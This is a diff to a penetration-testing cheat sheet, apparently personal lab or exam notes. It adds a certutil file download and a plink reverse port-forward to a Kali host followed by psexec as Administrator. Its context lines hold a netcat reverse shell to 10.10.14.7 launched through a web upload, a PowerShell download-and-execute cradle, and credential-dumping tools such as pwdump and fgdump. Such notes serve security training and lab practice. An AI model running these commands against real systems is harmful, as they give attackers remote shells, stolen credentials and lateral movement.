@@ -892,7 +892,7 @@ Upload and execute the payload download nc64.exe and upload via fupload and exec
     <url>?fupload=ms15-051x64.exe&fexec=ms15-051x64.exe "nc64.exe -e cmd 10.10.14.7 5555"
 
 
-*get files over windows shell*
+*get files over windows shell - windows download*
 
     ftp <ip>
     binary - so the files are having the correct chars
@@ -923,6 +923,10 @@ For old windows machines
 
     On Windows
     tftp -i <ip> get exploit.php
+
+*certutil windows download*
+
+    certutil -urlcache -f <url>/filename.exe filename.exe 
 
 *Powershell*
 
@@ -1004,7 +1008,7 @@ Other
     locate PowerUp.ps1
     and cp 
 
-Download with CMD
+Download with CMD Internet Explorer
 
     echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.7:8000/PowerUp.ps1') | powershell -noprofile -
 
@@ -1073,6 +1077,10 @@ List all the running services on the maschine that are automatically started and
     /v ignores anything that contains the given String
 
 Possible finding  C:\Program Files\... --> can be used by putting a file with name Files.exe under C:\Program
+
+*check ports and services*
+
+    netstat -ano
 
 *check dir permissions*
 
@@ -1175,8 +1183,6 @@ https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-
 
 **Post Exploitation**
 
-
-
 *Linux Post Exploitation*
 
 https://github.com/mubix/post-exploitation/wiki/Linux-Post-Exploitation-Command-List 
@@ -1185,7 +1191,7 @@ https://github.com/mubix/post-exploitation/wiki/Linux-Post-Exploitation-Command-
 
 Search for flags as well
 
-*Windows Post Exploitation*
+**Windows Post Exploitation**
 
     pwdump7
 
@@ -1194,6 +1200,41 @@ https://www.tarasco.org/security/pwdump_7/
     locate in Kali and transfer these files
     fgdump
     wce
+
+*Port forward*
+Uses plink.exe that is part of putty 
+https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html 
+https://the.earth.li/~sgtatham/putty/latest/w32/plink.exe 
+
+    apt install ssh
+    nano /etc/ssh/sshd_config
+    
+search the following line
+search the following line
+ 
+    #PermitRootLogin prohibit-password
+
+change following lines 
+
+    Port 8888
+    PermitRootLogin yes
+    service ssh restart
+    service ssh start
+
+Use Plink.exe on Windows to reverse connect to Kali
+
+    plink.exe -l root -pw toor <Kali_ip> -R 445:127.0.0.1:445 -P 8888
+    -R Port Forwarding
+    -P Port on Kali
+
+If the screen doesn't change hit enter until it continues.
+Check you connection
+
+    netstat -ano | grep 8888
+
+Next forward the Administrator access to localhost 445 if it look like it failed just repeat it
+
+    psexec.py "./Administrator:<pw>"@127.0.0.1
 
 *Unshadow*
 
